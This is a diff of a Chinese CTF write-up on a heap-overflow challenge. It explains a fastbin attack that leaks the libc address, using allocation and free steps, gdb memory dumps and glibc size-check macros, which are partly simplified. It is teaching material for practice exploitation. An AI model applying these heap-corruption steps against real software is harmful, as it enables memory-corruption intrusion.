@@ -13,7 +13,7 @@ main_arena是heap各种bin的结构体，他的偏移量可以在libc.so中mallo
 # 题目分析：<br>
 ![](img/menu.PNG)
 漏洞点在allocate的时候申请一个大小，但是在fill的时候可以无视这个大小去填充，所以这里存在堆溢出<br>
-### 1.fastbin attak：<br>
+## 1.fastbin attak：<br>
 核心思想是通过smallbin的fd或bk泄露main_arena的地址<br>
 两种leak libc的方式:<br>
 1> 通过修改smallbin的size,使得可以用其他bin如fastbin指向一个smallbin，之后再将smallbin的size修改回来，free掉smallbin,然后通过指向smallbin的fastbin将smallbin的fd和bk读出来<br>
@@ -21,7 +21,8 @@ main_arena是heap各种bin的结构体，他的偏移量可以在libc.so中mallo
 
 具体实现：<br>
 1>fastbin指向smallbin泄露libc<br>
-第一步先申请以下五个chunk,其中0-3是fastbin，4是smallbin
+### 第一步
+先申请以下五个chunk,其中0-3是fastbin，4是smallbin
 ```
 alloc(0x10) #0
 alloc(0x10) #1
@@ -45,7 +46,8 @@ gdb-peda$ x /64wx 0x555555757060
 0x555555757120:	0x00000000	0x00000000	0x00000000	0x00000000
 ```
 
-第二步，将chunk1和chunk2链在fastbin链表上，此时： fastbin->chunk2,chunk2->fd->chunk1
+### 第二步
+将chunk1和chunk2链在fastbin链表上，此时： fastbin->chunk2,chunk2->fd->chunk1
 ```
 #为了将 chunk4(smallbin) 放在fastbin的链表上 
 free(1)
@@ -67,7 +69,8 @@ gdb-peda$ x /64wx 0x555555757060
 0x555555757120:	0x00000000	0x00000000	0x00000000	0x00000000
 ```
 
-第三步，破坏fastbin的链表<br>
+### 第三步
+破坏fastbin的链表<br>
 原本:fastbin->chunk2, chunk2->fd->chunk1<br>
 破坏后:fastbin->chunk2, chunk2->fd->chunk4<br>
 ```
@@ -91,7 +94,30 @@ gdb-peda$ x /64wx 0x555555757060
 0x555555757110:	0x00000000	0x00000000	0x00000000	0x00000000
 ```
 
-第四步，
+第四步，为了alloc得到chunk4,必须要经过malloc的检测
+```
+if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
+{
+    errstr = "malloc(): memory corruption (fast)";
+errout:
+    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
+    return NULL;
+}
+```
+chunk4的chunksize的计算方法是`victim->size & ~(SIZE_BITS)`，即`chunk4->size & ~(SIZE_BITS)`,即`0x91 & ~(0x3)`,结果是`0x90`
+```
+#define PREV_INUSE 0x1
+#define IS_MMAPPED 0x2
+#define SIZE_BITS PREV_INUSE|IS_MMAPPED
+#define chunksize(p) (*(((unsigned int *)p)-1) & ~(SIZE_BITS))//取出size去掉后两标志位影响，8字节对齐
+```
+chunk4的fastbin_index计算方法如下，结果为`(0x90>>4)-2=7`
+```
+#define fastbin_index(sz) \
+  ((((unsigned int) (sz)) >> (SIZE_SZ == 8 ? 4 : 3)) - 2) //x86-64 SIZE_SZ=8, I386 SIZE_SZ=4
+```
+chunk2的chunksize的结果是0x20，fastbin_index的值是0x0<br>
+所以chunk4挂在了idx=0的fastbin上面，chunk4的的size也必须要被修改成0x21<br>
 
 
 
